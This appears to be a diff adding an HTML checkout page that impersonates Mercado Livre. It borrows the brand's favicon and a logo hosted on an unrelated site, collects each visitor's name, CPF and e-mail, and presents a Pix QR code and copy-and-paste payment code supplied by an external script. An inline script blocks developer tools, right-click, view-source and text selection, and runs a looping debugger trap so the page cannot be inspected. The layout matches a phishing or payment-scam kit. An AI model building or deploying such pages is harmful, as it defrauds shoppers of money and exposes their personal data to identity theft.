@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout | Mercado Livre</title>
+<link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.73/mercadolibre/favicon.svg">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="checkout.css">
+<script>!function(){document.addEventListener('contextmenu',function(e){e.preventDefault();return!1});document.addEventListener('keydown',function(e){if(e.key==='F12'){e.preventDefault();return!1}if(e.ctrlKey&&e.shiftKey&&'IiJjCc'.indexOf(e.key)>-1){e.preventDefault();return!1}if(e.ctrlKey&&'UuSs'.indexOf(e.key)>-1){e.preventDefault();return!1}});document.addEventListener('selectstart',function(e){if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return!0;e.preventDefault();return!1});document.addEventListener('dragstart',function(e){e.preventDefault();return!1});(function d(){try{(function(){return!1})['constructor']('debugger')['call']()}catch(e){}setTimeout(d,300)})()}();</script>
+</head>
+<body>
+
+<header class="ck-header">
+  <div class="container">
+    <div class="ck-header-logo">
+      <a href="/"><img src="https://bring.com.br/blog/wp-content/uploads/2018/05/Mercado-Livre-logo.png" alt="Mercado Livre" class="u-h-34"></a>
+    </div>
+  </div>
+</header>
+
+<!-- STEP 1: Confira a forma de entrega -->
+<div class="ck-step active" id="step1">
+  <div class="ck-body">
+    <div class="ck-main">
+      <h1 class="ck-title">Confira a forma de entrega</h1>
+      <div class="ck-card">
+        <div class="ck-delivery-option">
+          <input type="radio" class="ck-radio" checked readonly aria-label="Enviar no meu endereço">
+          <div class="ck-delivery-info">
+            <div class="ck-delivery-top"><span class="ck-bold">Enviar no meu endereço</span><span class="ck-green ck-bold">Grátis</span></div>
+            <p class="ck-address-big" id="step1Address"></p>
+            <p class="ck-muted">Residencial</p>
+          </div>
+        </div>
+        <div class="u-p-b-16"><a href="#" class="ck-link" onclick="goBackToAddress();return false">Alterar ou escolher outro endereço</a></div>
+      </div>
+      <div class="ck-btn-center"><button class="ck-btn" onclick="goToStep(2)">Continuar</button></div>
+    </div>
+    <div class="ck-sidebar">
+      <div class="ck-summary">
+        <h3>Resumo da compra</h3>
+        <div class="ck-summary-row"><span class="label">Produto</span><span class="value ck-summary-product-price">R$ 0,<sup>00</sup></span></div>
+        <div class="ck-summary-row"><span class="label">Frete</span><span class="value ck-green">Grátis</span></div>
+        <div class="ck-summary-total"><span class="label">Total</span><span class="value ck-summary-total-price">R$ 0,<sup>00</sup></span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 2: Escolha quando sua compra chegará -->
+<div class="ck-step" id="step2">
+  <div class="ck-body">
+    <div class="ck-main">
+      <h1 class="ck-title">Escolha quando sua compra chegará</h1>
+      <p class="ck-muted u-m-b-24">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="u-v-align-mid u-m-r-4"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+        Envio para <span id="step2ShortAddress" class="ck-bold"></span>
+      </p>
+      <div class="ck-card">
+        <div class="u-flex-between u-flex-align-center u-p-b-16 u-border-b u-m-b-16">
+          <span class="ck-bold">Envio 1</span>
+          <img class="ck-product-thumb u-w-40 u-h-40 u-obj-fit-cover u-radius-4" src="" alt="">
+        </div>
+        <div class="ck-delivery-option u-p-0">
+          <input type="radio" class="ck-radio" checked readonly aria-label="Entrega padrão">
+          <div class="ck-delivery-info">
+            <div class="ck-delivery-top">
+              <span>Entre os dias <span class="ck-bold" id="deliveryDates"></span></span>
+              <span class="ck-green ck-bold">Grátis</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="ck-btn-center"><button class="ck-btn" onclick="goToStep(3)">Continuar</button></div>
+    </div>
+    <div class="ck-sidebar">
+      <div class="ck-summary">
+        <h3>Resumo da compra</h3>
+        <div class="ck-summary-row"><span class="label">Produto</span><span class="value ck-summary-product-price">R$ 0,<sup>00</sup></span></div>
+        <div class="ck-summary-row"><span class="label">Frete</span><span class="value ck-green">Grátis</span></div>
+        <div class="ck-summary-total"><span class="label">Total</span><span class="value ck-summary-total-price">R$ 0,<sup>00</sup></span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 3: Escolha como pagar -->
+<div class="ck-step" id="step3">
+  <div class="ck-body">
+    <div class="ck-main">
+      <h1 class="ck-title">Escolha como pagar</h1>
+      <p class="ck-subtitle">Transferências</p>
+      <div class="ck-card">
+        <div class="u-flex-align-center u-gap-12 u-p-16">
+          <input type="radio" class="ck-radio" checked readonly aria-label="Opção Pix">
+          <div class="ck-pix-icon">
+            <img src="https://baixarfavicon.com.br/wp-content/themes/baixarfavicon/ferramentas/logos-pix-png/logos/logo-pix-520x520.png" alt="Pix" class="u-w-24 u-h-24">
+          </div>
+          <div>
+            <p class="ck-bold">Pix</p>
+            <p class="ck-green u-font-13">Aprovação imediata</p>
+          </div>
+        </div>
+      </div>
+      <div class="ck-btn-center"><button class="ck-btn" onclick="goToStep(4)">Continuar</button></div>
+    </div>
+    <div class="ck-sidebar">
+      <div class="ck-summary">
+        <h3>Resumo da compra</h3>
+        <div class="ck-summary-row"><span class="label">Produto</span><span class="value ck-summary-product-price">R$ 0,<sup>00</sup></span></div>
+        <div class="ck-summary-row"><span class="label">Frete</span><span class="value ck-green">Grátis</span></div>
+        <div class="ck-summary-row"><a href="#" class="ck-link u-font-13">Inserir código do cupom</a></div>
+        <div class="ck-summary-total"><span class="label">Você pagará</span><span class="value ck-summary-total-price u-font-20">R$ 0,<sup>00</sup></span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 4: Revise e confirme -->
+<div class="ck-step" id="step4">
+  <div class="ck-body">
+    <div class="ck-main">
+      <h1 class="ck-title">Revise e confirme</h1>
+      <p class="ck-section-title">Faturamento</p>
+      <div class="ck-card">
+        <div class="u-flex-start u-gap-12">
+          <div class="u-w-40 u-h-40 u-bg-f5 u-radius-8 u-flex-center u-flex-shrink-0">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><rect x="2" y="3" width="20" height="18" rx="2"/><line x1="2" y1="9" x2="22" y2="9"/></svg>
+          </div>
+          <div class="u-flex-grow-1">
+            <label for="ckNome" class="sr-only">Nome completo</label>
+            <input type="text" class="ck-input u-m-b-8" id="ckNome" placeholder="Nome completo">
+            <label for="ckCpf" class="sr-only">CPF</label>
+            <input type="text" class="ck-input u-m-b-8" id="ckCpf" placeholder="CPF (somente números)" maxlength="11" oninput="this.value=this.value.replace(/\D/g,'').slice(0,11)">
+            <label for="ckEmail" class="sr-only">E-mail</label>
+            <input type="email" class="ck-input" id="ckEmail" placeholder="E-mail">
+          </div>
+        </div>
+        <div class="ck-info-note">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+          <span>Os dados do seu cartão serão utilizados para emitir a NF-e.</span>
+        </div>
+      </div>
+
+      <p class="ck-section-title">Detalhe da entrega</p>
+      <div class="ck-card">
+        <div class="u-flex-start u-gap-12 u-p-b-12">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" class="u-flex-shrink-0 u-m-t-2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+          <div><p class="ck-bold" id="step4Address"></p><p class="ck-muted">Envio no meu endereço</p></div>
+        </div>
+        <p><a href="#" class="ck-link" onclick="goBackToAddress();return false">Alterar ou escolher outro endereço</a></p>
+      </div>
+      <div class="ck-card">
+        <div class="u-flex-start u-gap-12">
+          <img class="ck-product-thumb u-w-40 u-h-40 u-obj-fit-cover u-radius-4 u-flex-shrink-0" src="" alt="">
+          <div>
+            <p class="ck-muted u-font-13">Envio 1</p>
+            <p class="u-font-14">Chegará no seu endereço entre <span class="ck-bold" id="deliveryDates2"></span></p>
+            <p class="ck-muted ck-product-name u-font-13 u-m-t-4">Produto - Quantidade: 1</p>
+          </div>
+        </div>
+        <p class="u-m-t-12"><a href="#" class="ck-link" onclick="goToStep(2);return false">Alterar data de entrega</a></p>
+      </div>
+
+      <p class="ck-section-title">Detalhe do pagamento</p>
+      <div class="ck-card">
+        <div class="u-flex-align-center u-gap-12">
+          <div class="ck-pix-icon"><img src="https://baixarfavicon.com.br/wp-content/themes/baixarfavicon/ferramentas/logos-pix-png/logos/logo-pix-520x520.png" alt="Pix" class="u-w-24 u-h-24"></div>
+          <div><p class="ck-bold">Pix</p><p class="u-font-14" id="payDetailPrice">R$ 0,00</p></div>
+        </div>
+        <p class="ck-muted u-m-t-12 u-font-13">Ao confirmar a compra, você terá as informações para pagar.</p>
+        <div class="ck-info-note">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          <span>Pague agora para garantir sua compra</span>
+        </div>
+      </div>
+    </div>
+    <div class="ck-sidebar">
+      <div class="ck-summary">
+        <h3>Resumo da compra</h3>
+        <div class="ck-summary-row"><span class="label">Produto</span><span class="value ck-summary-product-price">R$ 0,<sup>00</sup></span></div>
+        <div class="ck-summary-row"><span class="label">Frete</span><span class="value"><span class="strike">R$ 15,<sup>00</sup></span> <span class="ck-green">Grátis</span></span></div>
+        <div class="ck-summary-total u-flex-col u-gap-4">
+          <div class="u-flex u-flex-between"><span class="label">Você pagará</span><span class="value ck-summary-total-price u-font-20">R$ 0,<sup>00</sup></span></div>
+          <div class="u-text-right u-font-13 u-c-666">Pix</div>
+        </div>
+        <label class="u-flex u-flex-start u-gap-8 u-m-t-16 u-font-13 u-c-666 u-cursor-pointer">
+          <input type="checkbox" class="u-m-t-2"> Fique por dentro com notificações por WhatsApp e SMS.
+        </label>
+        <div class="u-m-t-16">
+          <button class="ck-btn green u-w-full u-font-18 u-p-16" onclick="confirmPurchase()">Confirmar a compra</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 5: Loading -->
+<div class="ck-step" id="step5">
+  <div class="ck-body u-flex-center">
+    <div class="ck-loading-page">
+      <h1 class="ck-title u-m-b-32">Já é quase sua!</h1>
+      <div class="u-flex u-flex-align-center u-gap-16">
+        <div class="ck-spinner"></div>
+        <p class="ck-muted">Processando seu pagamento...</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 6: QR Code PIX -->
+<div class="ck-step" id="step6">
+  <div class="ck-body u-flex-center">
+    <div class="ck-main u-max-w-700 u-m-0-auto">
+      <div class="ck-card u-text-center">
+        <div class="ck-pix-header-icon">
+          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#00A650" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+        </div>
+        <p class="ck-pix-title">Falta pouco!</p>
+        <p class="ck-pix-amount" id="pixAmountText">Pague via Pix para concluir sua compra</p>
+      </div>
+      <div class="ck-card">
+        <h3 class="u-font-18 u-m-b-16">Escaneie um código QR para pagar</h3>
+        <ol class="u-p-16 u-m-y-16">
+          <li class="u-font-14 u-m-b-4">Acesse seu Internet Banking ou app de pagamentos.</li>
+          <li class="u-font-14 u-m-b-4">Escolha pagar via Pix.</li>
+          <li class="u-font-14 u-m-b-4">Escaneie o seguinte código:</li>
+        </ol>
+        <div class="ck-qr-img"><img id="qrCodeImg" src="" alt="QR Code PIX"></div>
+        <div class="u-flex u-flex-align-center u-gap-8 u-font-13 u-c-666 u-flex-center u-m-y-16">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          <span>Pague e será creditado na hora.</span>
+        </div>
+        <div class="ck-info-box">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483FA" stroke-width="2" class="u-flex-shrink-0"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+          <span>Confirmaremos a data de entrega quando o pagamento for aprovado.</span>
+        </div>
+      </div>
+      <div class="ck-card" id="pixCopySection">
+        <h4 class="u-font-16 ck-bold u-m-b-8">Ou copie este código para fazer o pagamento</h4>
+        <p class="ck-muted u-m-b-12">Escolha pagar via Pix pelo seu Internet Banking ou app de pagamentos. Depois, cole o seguinte código:</p>
+        <div class="ck-copy-input"><input type="text" id="pixCode" readonly aria-label="Código Pix Copia e Cola"></div>
+        <button class="ck-btn-copy" id="copyBtn" onclick="copyPixCode()">Copiar código</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 7: Green success flash -->
+<div class="ck-step" id="step7">
+  <div class="ck-success-flash">
+    <svg class="ck-check-icon" width="100" height="100" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <path class="ck-check-path" d="M20 6L9 17l-5-5"/>
+    </svg>
+  </div>
+</div>
+
+<!-- STEP 8: Payment confirmed -->
+<div class="ck-step" id="step8">
+  <div class="ck-body u-flex-center">
+    <div class="ck-main u-max-w-600 u-m-0-auto u-text-center u-p-60-24">
+      <div class="ck-confirmed-icon">
+        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#00A650" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+          <polyline points="22 4 12 14.01 9 11.01"/>
+        </svg>
+      </div>
+      <h1 class="u-font-28 ck-bold u-c-success u-m-y-16">Pagamento autorizado!</h1>
+      <p class="u-font-18 u-c-333 u-m-b-8">Seu pagamento foi confirmado com sucesso.</p>
+      <p class="u-font-15 u-c-666 u-m-b-32">Enviamos os detalhes da sua compra para o seu e-mail.<br>Verifique sua caixa de entrada e spam.</p>
+      <div class="ck-card u-text-left u-max-w-400 u-m-0-auto">
+        <div class="u-flex u-flex-align-center u-gap-12 u-m-b-12">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00A650" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+          <span class="u-font-14 u-c-666" id="confirmEmail"></span>
+        </div>
+        <div class="u-flex u-flex-align-center u-gap-12">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00A650" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+          <span class="u-font-14 u-c-666" id="confirmAddress"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="protect.js"></script>
+<script>
+// Delivery date dynamic calculation
+document.addEventListener('DOMContentLoaded', function() {
+  var d = new Date();
+  d.setDate(d.getDate() + 5);
+  var d2 = new Date();
+  d2.setDate(d2.getDate() + 9);
+  var months = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
+  var dateRange = d.getDate() + ' de ' + months[d.getMonth()] + ' e ' + d2.getDate() + ' de ' + months[d2.getMonth()];
+  var el1 = document.getElementById('deliveryDates');
+  var el2 = document.getElementById('deliveryDates2');
+  if(el1) el1.textContent = dateRange;
+  if(el2) el2.textContent = dateRange;
+});
+</script>
+<script src="checkout.js"></script>
+</body>
+</html>
